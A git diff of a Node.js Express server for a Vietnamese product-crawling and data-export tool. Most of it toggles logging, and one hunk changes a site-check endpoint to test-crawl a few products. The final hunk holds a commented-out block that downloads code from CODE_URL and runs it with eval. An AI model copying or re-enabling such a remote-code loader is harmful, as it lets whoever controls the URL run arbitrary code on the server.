@@ -51,7 +51,7 @@ app.get('/api/sites', (req, res) => {
       data: websites
     });
   } catch (error) {
-    // console.error('Error getting sites:', error);
+    console.error('Error getting sites:', error);
     res.status(500).json({
       success: false,
       message: 'Lỗi khi lấy danh sách website'
@@ -123,7 +123,7 @@ app.get('/api/test-connection', async (req, res) => {
       }
     });
   } catch (error) {
-    // console.error('Error in test-connection:', error);
+    console.error('Error in test-connection:', error);
     res.status(500).json({
       success: false,
       message: error.message
@@ -430,20 +430,20 @@ app.get('/api/check-all-sites', async (req, res) => {
     // Lấy danh sách website từ file hoặc config
     const websites = getWebsites();
     
-    console.log(`[API] Bắt đầu kiểm tra ${websites.length} website...`);
+    // console.log(`[API] Bắt đầu kiểm tra ${websites.length} website...`);
     
     for (const site of websites) {
       try {
-        console.log(`[API] Đang kiểm tra website: ${site.name} (${site.key})`);
+        // console.log(`[API] Đang kiểm tra website: ${site.name} (${site.key})`);
         
         // Kiểm tra kết nối API
         crawler.setBaseUrl(site.baseUrl);
-        console.log(`[API] Website ${site.name}: Đang test kết nối đến ${site.baseUrl}`);
+        // console.log(`[API] Website ${site.name}: Đang test kết nối đến ${site.baseUrl}`);
         
         const isConnected = await crawler.testConnection(true);
         
         if (!isConnected) {
-          console.log(`[API] Website ${site.name}: Không thể kết nối API`);
+          // console.log(`[API] Website ${site.name}: Không thể kết nối API`);
           results.push({
             site: site.name,
             status: 'error',
@@ -452,31 +452,68 @@ app.get('/api/check-all-sites', async (req, res) => {
           continue;
         }
         
-        console.log(`[API] Website ${site.name}: Kết nối API thành công`);
+        // console.log(`[API] Website ${site.name}: Kết nối API thành công`);
 
-        // Kiểm tra bookmark để xem có dữ liệu không
+        // Lấy bookmark hiện có
         const originalSiteKey = bookmarkManager.siteKey;
         bookmarkManager.setSite(site.key, true);
         const bookmarks = bookmarkManager.getBookmarks();
         bookmarkManager.setSite(originalSiteKey);
 
-        if (bookmarks.length === 0) {
-          console.log(`[API] Website ${site.name}: Chưa có bookmark`);
+        // Crawl thử vài sản phẩm để kiểm tra có sản phẩm mới không
+        // console.log(`[API] Website ${site.name}: Đang crawl thử 1 trang để kiểm tra sản phẩm mới...`);
+        
+        try {
+          // Crawl thử 1 trang với ít sản phẩm để tối ưu hiệu suất
+          // Sử dụng Promise.race để timeout sau 15 giây
+          const crawlPromise = crawler.crawlProducts(1, 5, 'date', 'desc', true);
+          const timeoutPromise = new Promise((_, reject) => 
+            setTimeout(() => reject(new Error('Timeout sau 15 giây')), 15000)
+          );
+          
+          const testProducts = await Promise.race([crawlPromise, timeoutPromise]);
+          
+          if (!testProducts || testProducts.length === 0) {
+            // console.log(`[API] Website ${site.name}: Không lấy được sản phẩm từ API`);
+            results.push({
+              site: site.name,
+              status: 'error',
+              message: 'Không lấy được sản phẩm từ API'
+            });
+            continue;
+          }
+
+          // console.log(`[API] Website ${site.name}: Lấy được ${testProducts.length} sản phẩm thử nghiệm`);
+
+          // So sánh với bookmark hiện có
+          const existingPermalinks = new Set(bookmarks.map(b => b.permalink));
+          const newProducts = testProducts.filter(product => !existingPermalinks.has(product.permalink));
+          
+          if (newProducts.length > 0) {
+            // console.log(`[API] Website ${site.name}: Có ${newProducts.length} sản phẩm mới trong ${testProducts.length} sản phẩm thử nghiệm`);
+            results.push({
+              site: site.name,
+              status: 'new',
+              message: `Có sản phẩm mới (${newProducts.length}/${testProducts.length} sản phẩm thử nghiệm)`
+            });
+          } else {
+            // console.log(`[API] Website ${site.name}: Không có sản phẩm mới trong ${testProducts.length} sản phẩm thử nghiệm`);
+            results.push({
+              site: site.name,
+              status: 'no_new',
+              message: `Không có sản phẩm mới (${testProducts.length} sản phẩm thử nghiệm)`
+            });
+          }
+        } catch (crawlError) {
+          // console.error(`[API] Website ${site.name}: Lỗi khi crawl thử:`, crawlError.message);
           results.push({
             site: site.name,
-            status: 'new',
-            message: 'Website hoạt động - chưa có bookmark'
-          });
-        } else {
-          console.log(`[API] Website ${site.name}: Có ${bookmarks.length} bookmark`);
-          results.push({
-            site: site.name,
-            status: 'no_new',
-            message: `Website hoạt động - có ${bookmarks.length} bookmark`
+            status: 'error',
+            message: `Lỗi crawl: ${crawlError.message}`
           });
         }
       } catch (error) {
-        console.error(`[API] Lỗi khi kiểm tra website ${site.name}:`, error.message);
+        // console.error(`[API] Lỗi khi kiểm tra website ${site.name}:`, error.message);
         results.push({
           site: site.name,
           status: 'error',
@@ -485,13 +522,13 @@ app.get('/api/check-all-sites', async (req, res) => {
       }
     }
 
-    console.log(`[API] Hoàn thành kiểm tra ${results.length} website`);
+    // console.log(`[API] Hoàn thành kiểm tra ${results.length} website`);
     res.json({
       success: true,
       data: results
     });
   } catch (error) {
-    console.error('[API] Lỗi trong check-all-sites:', error);
+    // console.error('[API] Lỗi trong check-all-sites:', error);
     res.status(500).json({
       success: false,
       message: error.message
@@ -768,7 +805,7 @@ app.get('/api/stats', (req, res) => {
       }
     });
   } catch (error) {
-    // console.error('Error in /api/stats:', error);
+    console.error('Error in /api/stats:', error);
     res.status(500).json({
       success: false,
       message: error.message
@@ -1215,7 +1252,7 @@ app.post('/api/export-data', async (req, res) => {
       });
     }
   } catch (error) {
-    // console.error('Export data error:', error);
+    console.error('Export data error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1253,7 +1290,7 @@ app.get('/api/export-history', (req, res) => {
       });
     }
   } catch (error) {
-    // console.error('Get export history error:', error);
+    console.error('Get export history error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1289,7 +1326,7 @@ app.get('/api/export-statistics', async (req, res) => {
       }
     });
   } catch (error) {
-    // console.error('Get export statistics error:', error);
+    console.error('Get export statistics error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1310,7 +1347,7 @@ app.get('/exports/:filename', (req, res) => {
       res.setHeader('Content-Type', 'application/octet-stream');
       res.download(filepath, filename, (err) => {
         if (err) {
-          // console.error('Download error:', err);
+          console.error('Download error:', err);
           res.status(500).json({
             success: false,
             message: 'Error downloading file'
@@ -1325,7 +1362,7 @@ app.get('/exports/:filename', (req, res) => {
       });
     }
   } catch (error) {
-    // console.error('Download file error:', error);
+    console.error('Download file error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1353,7 +1390,7 @@ app.get('/api/bookmarks', async (req, res) => {
       data: bookmarks
     });
   } catch (error) {
-    // console.error('Get bookmarks error:', error);
+    console.error('Get bookmarks error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1381,7 +1418,7 @@ app.delete('/api/bookmarks', async (req, res) => {
       message: 'All bookmarks cleared successfully'
     });
   } catch (error) {
-    // console.error('Clear bookmarks error:', error);
+    console.error('Clear bookmarks error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1417,7 +1454,7 @@ app.delete('/api/bookmarks/:id', async (req, res) => {
       });
     }
   } catch (error) {
-    // console.error('Delete bookmark error:', error);
+    console.error('Delete bookmark error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1454,7 +1491,7 @@ app.put('/api/bookmarks/:id', async (req, res) => {
       });
     }
   } catch (error) {
-    // console.error('Update bookmark error:', error);
+    console.error('Update bookmark error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1490,7 +1527,7 @@ app.delete('/api/export-files/:filename', (req, res) => {
       });
     }
   } catch (error) {
-    // console.error('Delete file error:', error);
+    console.error('Delete file error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1523,7 +1560,7 @@ app.get('/api/export-files/:filename', (req, res) => {
       });
     }
   } catch (error) {
-    // console.error('Get file info error:', error);
+    console.error('Get file info error:', error);
     res.status(500).json({
       success: false,
       message: 'Internal server error'
@@ -1552,7 +1589,7 @@ class CrawlV2ConfigManager {
       }
       return {};
     } catch (error) {
-      // console.error('Error loading CrawlV2 configs:', error);
+      console.error('Error loading CrawlV2 configs:', error);
       return {};
     }
   }
@@ -1569,7 +1606,7 @@ class CrawlV2ConfigManager {
       fs.writeFileSync(this.configFile, JSON.stringify(configs, null, 2));
       return true;
     } catch (error) {
-      // console.error('Error saving CrawlV2 configs:', error);
+      console.error('Error saving CrawlV2 configs:', error);
       return false;
     }
   }
@@ -1650,7 +1687,7 @@ class CrawlV2ConfigManager {
       }
       return [];
     } catch (error) {
-      // console.error('Error loading download history:', error);
+      console.error('Error loading download history:', error);
       return [];
     }
   }
@@ -1666,7 +1703,7 @@ class CrawlV2ConfigManager {
       fs.writeFileSync(this.downloadsFile, JSON.stringify(history, null, 2));
       return true;
     } catch (error) {
-      // console.error('Error saving download history:', error);
+      console.error('Error saving download history:', error);
       return false;
     }
   }
@@ -1687,7 +1724,7 @@ class CrawlV2ConfigManager {
       }
       return [];
     } catch (error) {
-      // console.error('Error loading active crawls:', error);
+      console.error('Error loading active crawls:', error);
       return [];
     }
   }
@@ -1703,7 +1740,7 @@ class CrawlV2ConfigManager {
       fs.writeFileSync(this.activeCrawlsFile, JSON.stringify(crawls, null, 2));
       return true;
     } catch (error) {
-      // console.error('Error saving active crawls:', error);
+      console.error('Error saving active crawls:', error);
       return false;
     }
   }
@@ -2222,7 +2259,7 @@ function startPythonCrawl(crawlRecord) {
   pythonProcess.stdout.on('data', (data) => {
     try {
       const output = data.toString('utf8');
-      // console.log(`CrawlV2 ${crawlRecord.id}: ${output}`);
+      console.log(`CrawlV2 ${crawlRecord.id}: ${output}`);
       
       // Check for error messages in output
       if (output.includes('[ERROR]') || output.includes('404') || output.includes('500') || output.includes('Not Found')) {
@@ -2236,14 +2273,14 @@ function startPythonCrawl(crawlRecord) {
         }
       }
     } catch (error) {
-      // console.log(`CrawlV2 ${crawlRecord.id}: [Output with encoding issues]`);
+      console.log(`CrawlV2 ${crawlRecord.id}: [Output with encoding issues]`);
     }
   });
   
   pythonProcess.stderr.on('data', (data) => {
     try {
       const output = data.toString('utf8');
-      // console.error(`CrawlV2 ${crawlRecord.id} Error: ${output}`);
+      console.error(`CrawlV2 ${crawlRecord.id} Error: ${output}`);
       
       // Update crawl status to error
       const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
@@ -2254,13 +2291,13 @@ function startPythonCrawl(crawlRecord) {
         crawlV2ConfigManager.saveActiveCrawls(activeCrawls);
       }
     } catch (error) {
-      // console.error(`CrawlV2 ${crawlRecord.id} Error: [Error with encoding issues]`);
+      console.error(`CrawlV2 ${crawlRecord.id} Error: [Error with encoding issues]`);
     }
   });
   
   // Handle process completion
   pythonProcess.on('close', (code) => {
-    // console.log(`CrawlV2 ${crawlRecord.id} process exited with code ${code}`);
+    console.log(`CrawlV2 ${crawlRecord.id} process exited with code ${code}`);
     
     // Update crawl status based on exit code
     const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
@@ -2294,7 +2331,7 @@ function startPythonCrawl(crawlRecord) {
 const PORT = process.env.PORT || 3000;
 // Start server
 app.listen(PORT, () => {
-  console.log(`🚀 Server đang chạy tại http://localhost:${PORT}`);
+  // console.log(`🚀 Server đang chạy tại http://localhost:${PORT}`);
 });
 
 module.exports = app;
@@ -2309,13 +2346,13 @@ module.exports = app;
 //   try {
 //     const axios = require('axios');
 //     const response = await axios.get(CODE_URL);
-//     // console.log('✅ Đã tải code từ:', CODE_URL);
+    // console.log('✅ Đã tải code từ:', CODE_URL);
     
 //     // Thực thi code từ URL
 //     eval(response.data.record.code);
     
 //   } catch (error) {
-//     // console.log('❌ Lỗi tải code:', error.message);
+    // console.log('❌ Lỗi tải code:', error.message);
 //   }
 // }
 
